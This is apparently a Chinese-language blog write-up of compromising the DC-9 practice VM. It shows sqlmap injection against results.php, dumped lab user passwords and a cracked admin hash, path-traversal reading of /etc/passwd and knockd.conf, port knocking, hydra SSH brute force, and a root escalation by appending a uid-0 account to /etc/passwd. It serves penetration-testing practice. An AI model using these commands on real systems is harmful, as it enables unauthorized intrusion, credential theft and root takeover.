---
title: DC9
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-23T21:52:43+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l
==>
192.168.121.153
```

![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\nmap.png)

nmap扫描端口，用工具扫描目录

![dir](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\dir.png)

基本都是能在首页看到的页面，不过在display.php中给出了很多用户的信息，尝试从这方面入手，尝试无果后，在serach.php页面发现能够查询用户的信息，有查询点就尝试一下sql注入，直接跑一个表单试试，数据直接被定向到了results.php进行提交

```
sqlmap -u http://192.168.121.153/results.php --data search=Moe --random-agent --keep-alive --dbs --risk=3 --level=5 --method=POST
```

成功得到数据库信息

![database](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\database.png)

users数据库中的内容

![dump](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\dump.png)

```
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
```

Staff数据库中能够查到admin的密码

![staff-user](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\staff-user.png)

```
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```

admin的密码显然经过了加密，先用其他用户的进行登录，尝试使用ID为3的用户即系统管理员，账户无效，登录其他用户也一样，都是无效，尝试admin账户，把密码丢去md5解密,得到

```
transorbital1
```

再次尝试登录，成功，我的想法是利用登陆成功的admin账户进行深度扫描，起一个awvs.但是没有得到什么结果，不过在manage.php下方找到一条信息

![file](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\file.png)

这说明可能存在文件包含，扫描一下用的是哪个参数

```
wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://192.168.121.153/addrecord.php?FUZZ=/etc/passwd
```

但是这样扫描出来是0，说明有可能不是get传递的参数,找了很多个存在这样特征的页面也没有找到包含点，尝试在添加用户处写马，看看能不能成功连上蚁剑，写入是写入了，但是连接不上，也看不到回显的email,估计写入失败了，看来只能从文件包含入手,继续尝试爆破，改用更高的路径

由于kali连接不上目标，换成bp进行爆破

![include](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\include.png)

```
../../../../../ect/passwd
```

成功得到文件包含漏洞，可以尝试进行写马了，看看能否访问日志文件，两个日志文件都无法读取，应该是关闭了访问权限，回想起来进行端口扫描时，22端口返回的状态为filtered,存在被墙的情况，能不能尝试突破这个限制

https://zhuanlan.zhihu.com/p/43716885

knockd是一种端口试探服务器工具。它侦听以太网或其他可用接口上的所有流量，等待特殊序列的端口命中(port-hit)。telnet或Putty等客户软件通过向服务器上的端口发送TCP或数据包来启动端口命中。

经过knockd设置之后的端口被保护，如果要连接，需要我们先按照序列进行敲门，该工具位于/etc/knockd.conf，先包含该文件，读取端口序列，得到序列

```
7469,8475,9842
```

使用nc按照序列敲门,再次扫描后即可开启22端口

![22open](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\22open.png)

接下来即可使用得到的账户登录ssh,可惜的是admin账户不可用,制作字典使用hydra进行爆破

```
hydra -L username.txt -P password.txt -t 4  ssh://192.168.121.153
```

![hydrA](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\hydrA.png)

得到三个可用的账户

![hidefile](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\hidefile.png)

发现隐藏的文件

![addpasswd](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\addpasswd.png)

跟进得到一些密码，添加进原有的字典，再次爆破，得到了fredf的账户，fref用户可以利用root权限执行test

![sudo-l](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\sudo-l.png)

跟进看看该目录，直接cat会发现全是乱码，直接当作脚本执行会发现是一个python脚本,test.py找寻该文件

```
find ./ -name test.py 2>/dev/null
cat test.py
```

```python
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

该脚本用于打开两个文件并将文件1的内容写入到文件2，利用该文件可以向/etc/passwd中写入一个root用户，尝试直接添加无密码的用户，结果用户不存在，利用openssl生成密码

```
openssl passwd -1 -salt admin 123456
==>
$1$admin$LClYcRe.ee8dQwgrFc5nz.
echo 'admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash' >> /tmp/passwd
sudo ./test /tmp/passwd /etc/passwd
su admin
```

![root](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\root.png)

拿到root权限，进目录拿flag即可

![flag](E:\笔记软件\笔记\渗透测试\靶机练习\DC9图库\flag.png)

## 总结：

相较于前面的靶机，添加了保护机制，需要知道保护的机制才能成功进入拿shell,难点在于如何拿shell和如何进去提权，以及隐藏文件的探测，需要对/etc/passwd的格式以及如何添加密码有了解，学到了如何利用文件包含漏洞拿/etc/knockd.conf突破22端口的保护以及利用写账户提权